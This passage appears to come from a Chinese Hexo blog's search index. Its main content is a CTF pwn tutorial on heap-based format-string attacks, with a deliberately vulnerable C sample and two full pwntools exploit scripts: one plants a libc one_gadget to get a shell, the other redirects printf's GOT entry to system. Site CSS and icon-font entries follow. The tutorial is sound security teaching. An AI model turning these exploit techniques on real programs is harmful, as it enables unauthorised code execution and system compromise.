class="hljs-string">&quot;&quot;&quot;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="非栈中格式化字符串">非栈中格式化字符串</h2><blockquote><p>堆中的格式化字符串比较麻烦<br>需要的条件为栈中存在 a 指向 b ，且b只有低四字节与a不同，<br>这时可以通过a修改b，然后利用b，在栈中创建一个指向某个区域的地址，<br>以此来达到任意地址读写</p></blockquote><p>一般存在两次函数调用操作时可以达到条件如 函数a调用函数b;函数b调用函数c<br>但 __libc_start_main 调用main,main调用某个函数除外，<br>因为__libc_start_main到main函数时储存在栈中的rbp/ebp为0，无法组成链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 样例代码 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">char</span> *b)</span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%40s&quot;</span>,b);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(b,<span class="hljs-string">&quot;exit&quot;</span>,<span class="hljs-number">4</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;nonono\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> *b=(<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);;<br>    <span class="hljs-keyword">do</span>&#123;<br>        <span class="hljs-keyword">if</span> (vuln(b)==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">0x20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input username:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%20s&quot;</span>,a);<br>    <span class="hljs-built_in">printf</span>(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&#x27;s password:&quot;</span>);<br>    func();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format1-1.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format1-2.jpg" srcset="/img/loading.gif" lazyload alt="main函数栈布局" title="main函数栈布局"></p><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format1-3.jpg" srcset="/img/loading.gif" lazyload alt="func函数代码" title="func函数代码"></p><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format1-4.jpg" srcset="/img/loading.gif" lazyload alt="func函数栈布局" title="func函数栈布局"></p><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format1-5.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><img src="/img/blog_img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/pwn-format1.jpg" srcset="/img/loading.gif" lazyload alt="泄露栈中数据" title="泄露栈中数据"><br>先通过多个 %p 泄露栈中的数据，用来查找可以利用的地址</p><p>这个样例符合条件，其中<code>main</code>函数调用<code>func</code>函数,<code>func</code>函数调用<code>vuln</code>函数<br>这样在栈中 至少保存了<code>main</code>函数的<code>rbp</code>与<code>func</code>函数的<code>rbp</code><br>而<code>func</code>函数的<code>rbp</code>指向的地址储存的是<code>main</code>函数的<code>rbp</code>的值<br>刚好形成一个链表</p><p>在这个样例中，因为可以利用栈达到任意地址读写，做法也就多种多样了<br>这里演示了控制返回地址为<code>gadget</code>获取<code>shell</code>，还可以通过设置<code>got表</code>调用<code>system</code>函数</p><h3 id="第一种">第一种</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    因为是在栈中，可以控制函数的返回地址</span><br><span class="hljs-string">    这个攻击代码中，设置main函数返回地址为 libc中调用execve(&quot;/bin/sh&quot;)的代码地址</span><br><span class="hljs-string">    还要把储存__libc_start_main函数rbp指针的位置写入新的rbp</span><br><span class="hljs-string">    而且这个rbp一定要大于 rsp且处于可写地址,否则会导致程序报错中断</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">for</span> gadget <span class="hljs-keyword">in</span> [<span class="hljs-number">0xde78c</span>,<span class="hljs-number">0xde78f</span>,<span class="hljs-number">0xde792</span>]:<br>    libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>    e=ELF(<span class="hljs-string">&#x27;./pwn_format&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>    p=process(<span class="hljs-string">&#x27;./pwn_format&#x27;</span>)<br>    libc_ind=<span class="hljs-number">13</span><br>    p.read()<br>    p.sendline(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(libc_ind)+<span class="hljs-string">&#x27;$p&#x27;</span>)<br>    c=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\&#x27;s&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(c))<br><br>    libc.address=c-<span class="hljs-number">213</span>-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    sind=<span class="hljs-number">8</span><br>    eind=<span class="hljs-number">12</span><br>    p.readuntil(<span class="hljs-string">&#x27;password:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;%&#123;&#125;$p.%&#123;&#125;$p&#x27;</span>.<span class="hljs-built_in">format</span>(sind,eind))<br>    data=p.read()[:-<span class="hljs-number">7</span>].split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    s1=<span class="hljs-built_in">int</span>(data[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>)<br>    s2=<span class="hljs-built_in">int</span>(data[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s1),<span class="hljs-built_in">hex</span>(s2))<br><br>    ori=s2&amp;<span class="hljs-number">0xff</span><br>    ret=ori<br>    one_gadget=p64(libc.address+gadget)<br>    data=p64(s1+<span class="hljs-number">0x200</span>)+one_gadget<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address+gadget))<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">16</span>:<br>        payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(ret+i,sind)<br>        p.sendline(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(data[i])==<span class="hljs-number">0</span>:<br>            payload=<span class="hljs-string">&#x27;%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(eind)<br>            <br>        <span class="hljs-keyword">else</span>:<br>            payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(data[i]),eind)<br>        p.sendline(payload)<br>        i=i+<span class="hljs-number">1</span><br>    payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(ori,sind)<br>    p.sendline(payload)<br>    p.interactive()<br></code></pre></td></tr></table></figure><h3 id="第二种">第二种</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    因为 printf 函数与 system 函数属于同一个 libc，所以两个函数的真实地址也相近，</span><br><span class="hljs-string">    想要将printf改成system 函数，只需要修改低两个字节，</span><br><span class="hljs-string">    所以我们将 printf.got 与 printf.got+2 写入栈中</span><br><span class="hljs-string">    然后再 将 printf.got 中储存的低四字节替换为 system函数地址 的低四字节</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn_format&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn_format&#x27;</span>)<br>libc_ind=<span class="hljs-number">13</span><br>p.read()<br>p.sendline(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(libc_ind)+<span class="hljs-string">&#x27;$p&#x27;</span>)<br>c=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\&#x27;s&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(c))<br><br>libc.address=c-<span class="hljs-number">213</span>-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>printf_got=e.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sind=<span class="hljs-number">8</span><br>eind=<span class="hljs-number">12</span><br>p.readuntil(<span class="hljs-string">&#x27;password:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;%&#123;&#125;$p.%&#123;&#125;$p&#x27;</span>.<span class="hljs-built_in">format</span>(sind,eind))<br>data=p.read()[:-<span class="hljs-number">7</span>].split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>s1=<span class="hljs-built_in">int</span>(data[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>)<br>s2=<span class="hljs-built_in">int</span>(data[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s1),<span class="hljs-built_in">hex</span>(s2))<br><br>ori=s2&amp;<span class="hljs-number">0xff</span><br>ret=ori<br>data=p64(printf_got)+p64(printf_got+<span class="hljs-number">2</span>)<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">16</span>:<br>    payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(ret+i,sind)<br>    p.sendline(payload)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(data[i])==<span class="hljs-number">0</span>:<br>        payload=<span class="hljs-string">&#x27;%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(eind)<br>    <span class="hljs-keyword">else</span>:<br>        payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(data[i]),eind)<br>    p.sendline(payload)<br>    i=i+<span class="hljs-number">1</span><br>payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(ori,sind)<br>p.sendline(payload)<br><br>e=&#123;<span class="hljs-number">0</span>:system&amp;<span class="hljs-number">0xffff</span>,<span class="hljs-number">1</span>:((system&amp;<span class="hljs-number">0xffff0000</span>)&gt;&gt;<span class="hljs-number">16</span>)&#125;<br>n=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]<br>n.sort(key=<span class="hljs-keyword">lambda</span> d:e[d])<br><br>payload=<span class="hljs-string">&#x27;%&#123;&#125;c%&#123;&#125;$hn%&#123;&#125;c%&#123;&#125;$hn&#x27;</span>.<span class="hljs-built_in">format</span>(e[n[<span class="hljs-number">0</span>]],<span class="hljs-number">20</span>+n[<span class="hljs-number">0</span>],e[n[<span class="hljs-number">1</span>]]-e[n[<span class="hljs-number">0</span>]],<span class="hljs-number">20</span>+n[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(payload)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwnbase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>收藏</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[/* build time:Thu May 30 2024 11:28:47 GMT+0800 (中国标准时间)*/@font-face{font-family:iconfont;src:url(/font/font_1736178_lbnruvf0jn.woff2?t=1638112270225) format('woff2'),url(/font/font_1736178_lbnruvf0jn.woff?t=1638112270225) format('woff'),url(/font/font_1736178_lbnruvf0jn.ttf?t=1638112270225) format('truetype')}.iconfont{font-family:iconfont!important;font-size:16px;font-style:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.icon-coolapk:before{content:"\e600"}.icon-coolapk-fill:before{content:"\e603"}.icon-leetcode:before{content:"\e63f"}.icon-pencil:before{content:"\f06e"}.icon-brush:before{content:"\e64f"}.icon-pen:before{content:"\e639"}.icon-books:before{content:"\e7ac"}.icon-plan:before{content:"\e67d"}.icon-codeforces:before{content:"\e620"}.icon-v2ex:before{content:"\e60e"}.icon-bilibili:before{content:"\e609"}.icon-douban-fill:before{content:"\e60a"}.icon-zhihu-fill:before{content:"\e608"}.icon-gitee-fill:before{content:"\e6d0"}.icon-bookmark:before{content:"\e627"}.icon-book:before{content:"\ef46"}.icon-bookmark-fill:before{content:"\ef47"}.icon-briefcase:before{content:"\ef4f"}.icon-bug:before{content:"\ef54"}.icon-map:before{content:"\f040"}.icon-qrcode:before{content:"\f08d"}.icon-copyright:before{content:"\f28a"}.icon-exp-fill:before{content:"\e869"}.icon-speakernotes:before{content:"\e89c"}.icon-notebook:before{content:"\e709"}.icon-note:before{content:"\e883"}.icon-addrbook:before{content:"\ef12"}.icon-addrcard:before{content:"\ef13"}.icon-clipcheck:before{content:"\ef73"}.icon-cliplist:before{content:"\ef74"}.icon-code:before{content:"\ef79"}.icon-comment:before{content:"\ef7e"}.icon-mail:before{content:"\efae"}.icon-image:before{content:"\f024"}.icon-images:before{content:"\f025"}.icon-mobile:before{content:"\f052"}.icon-rss:before{content:"\f09c"}.icon-rss-fill:before{content:"\f09d"}.icon-th-large:before{content:"\f103"}.icon-friends:before{content:"\f133"}.icon-users:before{content:"\f13a"}.icon-docker:before{content:"\f18e"}.icon-music:before{content:"\f1d7"}.icon-kaggle:before{content:"\f1dd"}.icon-renren:before{content:"\f221"}.icon-steam:before{content:"\f23b"}.icon-alipay-fill:before{content:"\e759"}.icon-apple-fill:before{content:"\e75a"}.icon-baidu-fill:before{content:"\e75c"}.icon-bilibili-fill:before{content:"\e75d"}.icon-dingding-fill:before{content:"\e75e"}.icon-discord-fill:before{content:"\e763"}.icon-facebook-fill:before{content:"\e764"}.icon-github-fill:before{content:"\e768"}.icon-gitlab-fill:before{content:"\e769"}.icon-instagram-fill:before{content:"\e76b"}.icon-kakao-talk-fill:before{content:"\e76c"}.icon-codepen-fill:before{content:"\e76d"}.icon-linkedin-fill:before{content:"\e76f"}.icon-line-fill:before{content:"\e770"}.icon-medium-fill:before{content:"\e771"}.icon-evernote-fill:before{content:"\e774"}.icon-mini-program-fill:before{content:"\e775"}.icon-google-fill:before{content:"\e778"}.icon-playstation-fill:before{content:"\e779"}.icon-qq-fill:before{content:"\e77d"}.icon-reddit-fill:before{content:"\e77e"}.icon-pinterest-fill:before{content:"\e77f"}.icon-skype-fill:before{content:"\e780"}.icon-slack-fill:before{content:"\e781"}.icon-stack-overflow-fill:before{content:"\e783"}.icon-telegram-fill:before{content:"\e785"}.icon-tumblr-fill:before{content:"\e786"}.icon-snapchat-fill:before{content:"\e787"}.icon-taobao-fill:before{content:"\e788"}.icon-twitter-fill:before{content:"\e789"}.icon-twitch-fill:before{content:"\e78a"}.icon-switch-fill:before{content:"\e78b"}.icon-wechat2-fill:before{content:"\e78d"}.icon-wechat-fill:before{content:"\e78f"}.icon-youtube-fill:before{content:"\e790"}.icon-weibo-fill:before{content:"\e791"}.icon-whatsapp-fill:before{content:"\e792"}.icon-xbox-fill:before{content:"\e795"}/* rebuild by neat */]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>about</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<p>QQ: 2127361651</p><p>记录生活</p>]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[/* build time:Thu May 30 2024 11:28:47 GMT+0800 (中国标准时间)*/.img_box{line-height:30px;text-align:center;margin-top:15px;padding-bottom:15px;transition:all .15s;font-size:14px;border:1px solid #404040;box-shadow:0 0 6px 0 #484848}.img_box:hover{font-weight:700;box-shadow:0 0 7px 3px #484848;border:1px solid #404040;border-radius:15px}.img_box img{object-fit:contain;max-height:600px}.img_box a{color:#aaa;font-family:"楷书"}.img_box a:hover{color:#aaa}.img_box span{display:inline-block}/* rebuild by neat */]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[/* build time:Thu May 30 2024 11:28:47 GMT+0800 (中国标准时间)*/.salient{padding-top:3px;padding-bottom:3px;padding-left:2px;padding-right:1px}.salient:hover{background-color:#3a4a5a;border:1px solid #454d68;box-shadow:0 0 10px 3px #454d58;padding-top:2px;padding-bottom:2px;padding-left:1px;padding-right:0}/* rebuild by neat */]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[/* build time:Thu May 30 2024 11:28:47 GMT+0800 (中国标准时间)*/.salient{padding-top:3px;padding-bottom:3px;padding-left:2px;padding-right:1px}.salient:hover{background-color:#daeafa;border:1px solid #d5ddf8;box-shadow:0 0 10px 3px #daeafa;padding-top:2px;padding-bottom:2px;padding-left:1px;padding-right:0}/* rebuild by neat */]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[/* build time:Thu May 30 2024 11:28:47 GMT+0800 (中国标准时间)*/@font-face{font-family:iconfont;src:url(/font/font_1749284_hj8rtnfg7um.woff2?t=1643373093955) format('woff2'),url(/font/font_1749284_hj8rtnfg7um.woff?t=1643373093955) format('woff'),url(/font/font_1749284_hj8rtnfg7um.ttf?t=1643373093955) format('truetype')}.iconfont{font-family:iconfont!important;font-size:16px;font-style:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.icon-success:before{content:"\e619"}.icon-cc:before{content:"\e8e4"}.icon-nd:before{content:"\e90e"}.icon-sa:before{content:"\e604"}.icon-nc:before{content:"\ed48"}.icon-by:before{content:"\e741"}.icon-top:before{content:"\e605"}.icon-author:before{content:"\e7aa"}.icon-light:before{content:"\e6e6"}.icon-dark:before{content:"\e640"}.icon-articles:before{content:"\e61f"}.icon-category-fill:before{content:"\e60d"}.icon-category:before{content:"\e65e"}.icon-chart:before{content:"\e618"}.icon-search:before{content:"\e6f2"}.icon-love:before{content:"\e643"}.icon-eye:before{content:"\e722"}.icon-archive-fill:before{content:"\ef1c"}.icon-date-fill:before{content:"\ef5a"}.icon-home-fill:before{content:"\f017"}.icon-link-fill:before{content:"\f037"}.icon-tags-fill:before{content:"\f0f3"}.icon-user-fill:before{content:"\f12c"}.icon-date:before{content:"\f27d"}.icon-copy:before{content:"\f289"}.icon-list:before{content:"\f2c0"}.icon-tags:before{content:"\e798"}.icon-clock-fill:before{content:"\e67d"}.icon-arrowup:before{content:"\e799"}.icon-arrowleft:before{content:"\f2c2"}.icon-arrowright:before{content:"\f2c3"}.icon-arrowdown:before{content:"\f2c4"}/* rebuild by neat */]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>友链</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[(function(window, document) {function change_style(isenc){    if (isenc==true)        var parentElement=document.getElementById("hexo-blog-encrypt").childNodes[0];    else        var parentElement = document.querySelector("[class='markdown-body']");    var pTags = parentElement.querySelectorAll(":scope>p");    for(var i=0;i<pTags.length;i++){        var child_es=pTags[i].querySelectorAll("img");        if (child_es.length==0){            pTags[i].classList.add('salient');        }    }}function loadImage(){    for (const each of document.querySelectorAll('img[lazyload]')) {        Fluid.utils.waitElementVisible(each, function() {          each.removeAttribute('srcset');          each.removeAttribute('lazyload');        }, CONFIG.lazyload.offset_factor);      }}const hdeElement=document.getElementById('hexo-blog-encrypt');if (hdeElement==null)    change_style();else{    window.addEventListener('hexo-blog-decrypt',(        function(){            change_style(true);            loadImage();            }));}})(window,document)]]></content>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[/* build time:Thu May 30 2024 11:28:47 GMT+0800 (中国标准时间)*/.img_box{background-color:#fbfbfb;line-height:30px;text-align:center;margin-top:15px;padding-bottom:15px;transition:all .15s;font-size:14px;border:1px solid silver;box-shadow:0 0 6px 0 #c8c8c8}.img_box:hover{font-weight:700;box-shadow:0 0 7px 3px #c8c8c8;border:1px solid silver;border-radius:15px}.img_box img{object-fit:contain;max-height:500px}.img_box a{color:#999;font-family:"楷书"}.img_box a:hover{color:#999}.img_box span{display:inline-block}/* rebuild by neat */]]></content>
    
  </entry>
  
  
  
</search>
